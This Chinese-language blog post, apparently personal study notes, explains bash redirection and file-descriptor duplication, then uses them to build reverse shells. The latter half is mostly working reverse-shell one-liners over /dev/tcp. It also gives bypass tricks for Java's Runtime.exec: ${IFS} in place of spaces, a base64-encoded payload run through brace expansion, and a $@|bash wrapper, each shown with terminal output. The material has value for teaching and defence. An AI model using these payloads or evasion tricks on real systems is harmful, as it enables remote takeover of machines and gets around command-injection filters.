    <content type="html"><![CDATA[<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>简单记忆: </p><ul><li><code>&gt;</code>可在<code>&amp;</code>前、后</li><li><code>&lt;</code>只能在<code>&amp;</code>前</li></ul><h3 id="1-输入重定向"><a href="#1-输入重定向" class="headerlink" title="1. 输入重定向"></a>1. 输入重定向</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828004794955.jpg" alt="-w693"></p><pre class=" language-shell"><code class="language-shell">test@test:/tmp$ cat < test_fileHello World~</code></pre><h3 id="2-输出重定向"><a href="#2-输出重定向" class="headerlink" title="2. 输出重定向"></a>2. 输出重定向</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828006043413.jpg" alt="-w693"></p><pre class=" language-shell"><code class="language-shell">test@test:/tmp$ echo 'Hello World~' > test_file test@test:/tmp$ cat test_file Hello World~</code></pre><h3 id="3-标准输出与标准错误输出重定向"><a href="#3-标准输出与标准错误输出重定向" class="headerlink" title="3. 标准输出与标准错误输出重定向"></a>3. 标准输出与标准错误输出重定向</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828006688727.jpg" alt="-w692"></p><pre class=" language-shell"><code class="language-shell">// bash 1test@test:/tmp$ bash -i &> test// bash 2test@test:~$ ls -l /proc/5693/fd总用量 0lrwx------ 1 test test 64 2月  27 19:00 0 -> /dev/pts/2l-wx------ 1 test test 64 2月  27 19:00 1 -> /tmp/testl-wx------ 1 test test 64 2月  27 19:00 2 -> /tmp/testlrwx------ 1 test test 64 2月  27 19:00 255 -> /dev/tty</code></pre><h3 id="4-文件描述符的复制"><a href="#4-文件描述符的复制" class="headerlink" title="4. 文件描述符的复制"></a>4. 文件描述符的复制</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828014944337.jpg" alt="-w836"></p><p>注意：</p><ol><li>两种形式都是将 word 复制给 n</li><li>在第二种形式<code>&gt;&amp;</code>最后的描述中，如果没有指定<code>n</code>，且<code>word</code>无法解释成<code>整数</code>或<code>-</code>，则此命令会被解释为<code>标准输出与标准错误输出重定向</code></li></ol><p>根据此两点，如果<strong>n为数字，则解析为<code>文件描述符复制</code></strong></p><hr><p>这里还需要将<code>文件描述符的复制</code>与<code>标准输出与标准错误输出重定向</code>拿出来比较一番，注意下面<code>&gt;&amp;5</code>与<code>&amp;&gt;5</code>的区别</p><p>即<code>&amp;</code>是否紧跟数字<code>n</code>，会区分为<code>文件描述符n</code>和<code>文件n</code></p><ul><li><code>&gt;&amp;5</code> -&gt; 将<code>文件描述符5</code>复制给<code>stdout</code></li><li><code>&amp;&gt;5</code> -&gt; 将<code>stdout</code>、<code>stderr</code>重定向到<code>当前目录下名为5的文件</code></li></ul><pre class=" language-shell"><code class="language-shell">test@test:/tmp$ exec 5<>test_file >&5test@test:~$ ls -l /proc/14396/fd总用量 0lrwx------ 1 test test 64 2月  29 14:16 0 -> /dev/pts/0lrwx------ 1 test test 64 2月  29 14:16 1 -> /tmp/test_filelrwx------ 1 test test 64 2月  29 14:16 2 -> /dev/pts/0lrwx------ 1 test test 64 2月  29 14:16 255 -> /dev/pts/0lrwx------ 1 test test 64 2月  29 14:16 5 -> /tmp/test_file---test@test:/tmp$ exec 5<>test_file &>5test@test:~$ ls -l /proc/14396/fd总用量 0lrwx------ 1 test test 64 2月  29 14:16 0 -> /dev/pts/0l-wx------ 1 test test 64 2月  29 14:16 1 -> /tmp/5l-wx------ 1 test test 64 2月  29 14:16 2 -> /tmp/5lrwx------ 1 test test 64 2月  29 14:16 255 -> /dev/pts/0lrwx------ 1 test test 64 2月  29 14:16 5 -> /tmp/test_file</code></pre><h3 id="5-打开文件描述符进行读写"><a href="#5-打开文件描述符进行读写" class="headerlink" title="5. 打开文件描述符进行读写"></a>5. 打开文件描述符进行读写</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15828164328837.jpg" alt="-w841"></p><blockquote><p>当exec命令对文件描述符操作的时候，就不会替换shell，而是操作完成后还会继续执行后面的命令</p></blockquote><pre class=" language-shell"><code class="language-shell">test@test:/tmp$ 5<>filetest@test:/tmp$ ls -l /proc/29753/fd总用量 0lrwx------ 1 test test 64 2月  29 12:04 0 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:04 1 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:04 2 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:04 255 -> /dev/pts/1---test@test:/tmp$ exec 5<>test_filetest@test:/tmp$ ls -l /proc/29753/fd总用量 0lrwx------ 1 test test 64 2月  29 12:04 0 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:04 1 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:04 2 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:04 255 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:04 5 -> /tmp/test_file</code></pre><h2 id="反弹"><a href="#反弹" class="headerlink" title="反弹"></a>反弹</h2><h3 id="文件描述符复制"><a href="#文件描述符复制" class="headerlink" title="文件描述符复制"></a>文件描述符复制</h3><p>最常见的模式</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 0<span class="token operator">></span><span class="token operator">&amp;</span>1// 省略非必要空格<span class="token function">bash</span> -i<span class="token operator">></span><span class="token operator">&amp;</span>/dev/tcp/127.0.0.1/12345 0<span class="token operator">></span><span class="token operator">&amp;</span>1</code></pre><h3 id="文件描述符复制-2"><a href="#文件描述符复制-2" class="headerlink" title="文件描述符复制 2"></a>文件描述符复制 2</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 <span class="token operator">&lt;</span><span class="token operator">&amp;</span>1// 省略非必要空格<span class="token function">bash</span> -i<span class="token operator">></span><span class="token operator">&amp;</span>/dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1</code></pre><h3 id="绑定重定向"><a href="#绑定重定向" class="headerlink" title="绑定重定向"></a>绑定重定向</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">exec</span> 5<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/192.168.146.129/2333<span class="token punctuation">;</span><span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token operator">&amp;</span>5<span class="token operator">|</span><span class="token keyword">while</span> <span class="token function">read</span> line<span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token variable">$line</span> <span class="token operator">></span><span class="token operator">&amp;</span>5 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span class="token punctuation">;</span><span class="token keyword">done</span></code></pre><p>注意为什么最后又加了一个<code>2&gt;&amp;1</code>呢？回头看看描述符复制注意的地方，就清楚了</p><hr><p>另外下面为什么没看到<code>进程30651的bash</code>中<code>stdout &amp; stderr</code>被重定向情况呢？因为每次<code>do</code>都是通过<strong>此bash</strong>新开启一个子进程，并在子进程内进行文件描述符的赋值</p><pre class=" language-shell"><code class="language-shell">test@test:~$ exec 5<>/dev/tcp/127.0.0.1/12345;cat <&5|while read line;do $line >&5 2>&1;done// 29753 执行反弹 shell 命令test     29753  4841  0 12:04 pts/1    00:00:00 bashtest     30640  4895  0 12:09 pts/2    00:00:00 nc -lvvp 12345test     30650 29753  0 12:09 pts/1    00:00:00 cattest     30651 29753  0 12:09 pts/1    00:00:00 bash// cattest@test:/tmp$ ls -l /proc/30650/fd总用量 0lrwx------ 1 test test 64 2月  29 12:48 0 -> 'socket:[1487308]'l-wx------ 1 test test 64 2月  29 12:48 1 -> 'pipe:[1487309]'lrwx------ 1 test test 64 2月  29 12:48 2 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:48 5 -> 'socket:[1487308]'// bashtest@test:/tmp$ ls -l /proc/30651/fd总用量 0lr-x------ 1 test test 64 2月  29 12:48 0 -> 'pipe:[1487309]'lrwx------ 1 test test 64 2月  29 12:48 1 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:48 2 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:48 255 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:48 5 -> 'socket:[1487308]'</code></pre><h4 id="额外的例子"><a href="#额外的例子" class="headerlink" title="额外的例子"></a>额外的例子</h4><p><code>&lt;&amp;996 &gt;&amp;996 2&gt;&amp;996</code>分别对应复制到<code>stdin stdout stderr</code></p><pre class=" language-shell"><code class="language-shell">0<&996;exec 996<>/dev/tcp/127.0.0.1/12345;sh <&996 >&996 2>&996// 变形exec 996<>/dev/tcp/127.0.0.1/123450 <&996 >&996 2>&996</code></pre><p>注意：变形的命令在连接端退出会导致此端同时退出，原因如下：</p><pre class=" language-shell"><code class="language-shell">// 0<&996;exec 996<>/dev/tcp/127.0.0.1/12345;sh <&996 >&996 2>&996test     18999  2516  0 14:44 pts/0    00:00:00 bashtest@test:~$ ls -l /proc/18999/fd总用量 0lrwx------ 1 test test 64 2月  29 14:44 0 -> 'socket:[106812]'lrwx------ 1 test test 64 2月  29 14:44 1 -> 'socket:[106812]'lrwx------ 1 test test 64 2月  29 14:45 196 -> 'socket:[106812]'lrwx------ 1 test test 64 2月  29 14:44 2 -> 'socket:[106812]'lrwx------ 1 test test 64 2月  29 14:44 255 -> /dev/pts/0---// exec 996<>/dev/tcp/127.0.0.1/123450 <&996 >&996 2>&996test     18999  2516  0 14:44 pts/0    00:00:00 bashtest     20566 18999  0 14:53 pts/0    00:00:00 shtest@test:~$ ls -l /proc/18999/fd总用量 0lrwx------ 1 test test 64 2月  29 14:44 0 -> /dev/pts/0lrwx------ 1 test test 64 2月  29 14:44 1 -> /dev/pts/0lrwx------ 1 test test 64 2月  29 14:45 196 -> 'socket:[105103]'lrwx------ 1 test test 64 2月  29 14:44 2 -> /dev/pts/0lrwx------ 1 test test 64 2月  29 14:44 255 -> /dev/pts/0test@test:~$ ls -l /proc/20566/fd总用量 0lrwx------ 1 test test 64 2月  29 14:53 0 -> 'socket:[105103]'lrwx------ 1 test test 64 2月  29 14:53 1 -> 'socket:[105103]'lrwx------ 1 test test 64 2月  29 14:53 196 -> 'socket:[105103]'lrwx------ 1 test test 64 2月  29 14:53 2 -> 'socket:[105103]'</code></pre><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15829596110947.jpg" alt="https://xz.aliyun.com/t/2549#toc-8"></p><h2 id="反弹-in-Java"><a href="#反弹-in-Java" class="headerlink" title="反弹 in Java"></a>反弹 in Java</h2><h3 id="Runtime-getRuntime-exec"><a href="#Runtime-getRuntime-exec" class="headerlink" title="Runtime.getRuntime().exec"></a>Runtime.getRuntime().exec</h3><h4 id="exec-new-String"><a href="#exec-new-String" class="headerlink" title="exec(new String[])"></a>exec(new String[])</h4><p>在此模式解析的关键是<code>java.lang.UNIXProcess#UNIXProcess</code>，在<code>-c</code>模式下，可以看到参数为两个</p><p>P.S. 个人认为是因为如<code>&gt;&amp;</code>等参数无法被识别为bash参数，它应属于当前 bash 环境下的操作</p><ol><li><p>直接数组化无法解析，解析参数为 4 个</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816475716996.jpg" alt="-w1640"><br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15840206558058.jpg" alt="-w1005"></p></li><li><p>数组化 with <code>-c</code>能正确解析，解析参数为 2 个</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816478550627.jpg" alt="-w1680"><br> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816487793325.jpg" alt="-w996"></p></li></ol><h4 id="exec-new-String-1"><a href="#exec-new-String-1" class="headerlink" title="exec(new String)"></a>exec(new String)</h4><p>如果我们只传入一个字符串时，会经过 StringTokenizer 分割，注意会识别<strong>五个</strong>字符</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816481561408.jpg" alt="-w537"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816521932598.jpg" alt="-w631"></p><p>所以我们需要找到一个字符能够绕过分割且能被<code>/bin/bash</code>正确识别为空格</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="IFS"><a href="#IFS" class="headerlink" title="${IFS}"></a>${IFS}</h3><blockquote><p>一般情况下，<code>$var</code>与<code>${var}</code>并没有啥不一样。但是用<code>${ }</code>会比较精确的界定变量名称的范围</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15816540712094.jpg" alt="-w489"></p><p>如果直接利用会报错<code>ambiguous redirect(歧义重定向)</code></p><pre class=" language-shell"><code class="language-shell"># 报错 ambiguous redirectbash-3.2$ bash${IFS}-i${IFS}>&${IFS}/dev/tcp/127.0.0.1/12345${IFS}0>&1bash: ${IFS}/dev/tcp/127.0.0.1/12345${IFS}0: ambiguous redirect# 正常bash-3.2$ bash${IFS}-i${IFS}>&${IFS}/dev/tcp/127.0.0.1/12345 0>&1</code></pre><p>那么最后一个空格该如何处理呢，我们可以看到，经过<code>&gt;&amp; socks</code>后，stdou stderr 已经被重定向到了 socks 文件，最后一句<code>0&gt;&amp;1</code>就是试图将 stdin 也重定向过去</p><pre class=" language-bash"><code class="language-bash">test@test:~$ <span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345test@test:~$ <span class="token function">ls</span> -l /proc/14067/fd总用量 0lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:05 0 -<span class="token operator">></span> /dev/pts/1lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:05 1 -<span class="token operator">></span> <span class="token string">'socket:[924955]'</span>lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:05 10 -<span class="token operator">></span> /dev/ttylrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:05 2 -<span class="token operator">></span> <span class="token string">'socket:[924955]'</span></code></pre><p>注意到<code>文件描述符的复制</code>中<code>[n]&lt;&amp;word</code>格式，我们可以将 socks 文件描述符复制到 stdin 中</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 0<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true"># 添加 IFS</span><span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token variable">${IFS}</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token variable">${IFS}</span>/dev/tcp/127.0.0.1/12345<span class="token variable">${IFS}</span>0<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1</code></pre><p>同时由于 n 默认为 stdin，那么我们也可以利用此规则不出现 0</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 <span class="token operator">&lt;</span><span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true"># 添加 IFS</span><span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token variable">${IFS}</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token variable">${IFS}</span>/dev/tcp/127.0.0.1/12345<span class="token variable">${IFS}</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span>1</code></pre><p>甚至省略最后的空格，以及非必要的空格</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true"># 添加 IFS</span><span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token variable">${IFS}</span><span class="token operator">></span><span class="token operator">&amp;</span><span class="token variable">${IFS}</span>/dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1<span class="token comment" spellcheck="true"># 省略非必要空格+IFS 测试</span>test@test:~$ <span class="token function">bash</span><span class="token variable">${IFS}</span>-i<span class="token operator">></span><span class="token operator">&amp;</span>/dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1test@test:~$ <span class="token function">ls</span> -l /proc/14556/fd总用量 0lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:08 0 -<span class="token operator">></span> <span class="token string">'socket:[928815]'</span>lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:08 1 -<span class="token operator">></span> <span class="token string">'socket:[928815]'</span>lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:08 2 -<span class="token operator">></span> <span class="token string">'socket:[928815]'</span>lrwx------ 1 <span class="token function">test</span> <span class="token function">test</span> 64 2月  27 23:08 255 -<span class="token operator">></span> /dev/tty</code></pre><h3 id="bash-Brace-Expansion"><a href="#bash-Brace-Expansion" class="headerlink" title="bash Brace Expansion"></a>bash Brace Expansion</h3><p>花括号扩展，详细见参考资料 3</p><pre class=" language-shell"><code class="language-shell">test@test:~$ echo hello{'world','linux'},helloworld, hellolinux,test@test:~$ echo hello{1..5},hello1, hello2, hello3, hello4, hello5,</code></pre><pre class=" language-shell"><code class="language-shell">test@test:~$ bash -c "{echo,YmFzaCAtaT4mL2Rldi90Y3AvMTI3LjAuMC4xLzEyMzQ1PCYxCg==}|{base64,-d}|{bash,-i}"Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaT4mL2Rldi90Y3AvMTI3LjAuMC4xLzEyMzQ1PCYxCg==}|{base64,-d}|{bash,-i}");</code></pre><h3 id><a href="#" class="headerlink" title="$@ $*"></a><code>$@</code> <code>$*</code></h3><p>细节及区别详见：<a href="http://c.biancheng.net/cpp/view/2739.html" target="_blank" rel="noopener">Shell特殊变量</a></p><table><thead><tr><th>参数处理</th><th>说明</th></tr></thead><tbody><tr><td><code>$*</code></td><td>以一个单字符串显示所有向脚本传递的参数。<br>如<code>$*</code>用<code>&quot;</code>括起来的情况、以<code>$1 $2 … $n</code>的形式输出所有参数。</td></tr><tr><td><code>$@</code></td><td>与<code>$*</code>相同，但是使用时加引号，并在引号中返回每个参数。<br>如<code>$@</code>用<code>&quot;</code>括起来的情况、以<code>&quot;$1&quot; &quot;$2&quot; … &quot;$n&quot;</code>的形式输出所有参数。</td></tr></tbody></table><p>以下内容来自</p><p>那么我们就可以利用来反弹shell了。看bash语法：</p><pre class=" language-shell"><code class="language-shell">bash [options] [command_string | file]-c   If the -c option is present, then commands are read from the first non-option argument command_string.If there are arguments after the command_string, they are assigned to the positional parameters, starting with $0.</code></pre><p>结合bash和$@，我们可以变为：</p><pre class=" language-shell"><code class="language-shell">/bin/sh -c '$@|sh' xxx  echo ls</code></pre><p>可以成功地执行<code>ls</code>。分析下这个命令，当<code>bash</code>解析到<code>&#39;$@|sh&#39; xxx echo ls</code>，发现<code>$@</code>。<code>$@</code>需要取脚本的参数，那么就会解析<code>xxx echo ls</code>，由于<code>$@</code>只会取脚本参数，会将第一个参数认为是脚本名称<strong>(认为<code>xxx</code>是脚本名称)</strong>，就会取到<code>echo ls</code>。那么最终执行的就是<code>echo ls|sh</code>，就可以成功地执行<code>ls</code>命令了。</p><p>利用上面这个<code>trick</code>，那么我们就可以执行任意命令了，包括反弹shell。如<code>/bin/bash -c &#39;$@|bash&#39; 0 echo &#39;bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1&#39;</code>最终可以成功地反弹shell</p><pre class=" language-shell"><code class="language-shell">Runtime.getRuntime().exec("/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/8888 0>&1");Runtime.getRuntime().exec("/bin/bash -c $*|bash 0 echo bash -i >&/dev/tcp/127.0.0.1/8888 0>&1");</code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/91ba290f/15831418726956.jpg" alt="-w974"></p><p>最终相当于执行了<code>echo &#39;bash -i &gt;&amp;/dev/tcp/127.0.0.1/8888 0&gt;&amp;1&#39;|bash</code>命令，成功反弹shell</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://xz.aliyun.com/t/2548#toc-0" target="_blank" rel="noopener">Linux反弹shell（一）文件描述符与重定向</a></li><li><a href="https://xz.aliyun.com/t/2549#toc-8" target="_blank" rel="noopener">Linux 反弹shell（二）反弹shell的本质</a></li><li><a href="https://www.cnblogs.com/leixiao-/p/10216571.html" target="_blank" rel="noopener">linux下形如{command,parameter,parameter}执行命令 / bash花括号扩展</a></li><li><a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/" target="_blank" rel="noopener">绕过exec获取反弹shell</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;笔记&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
</feed>
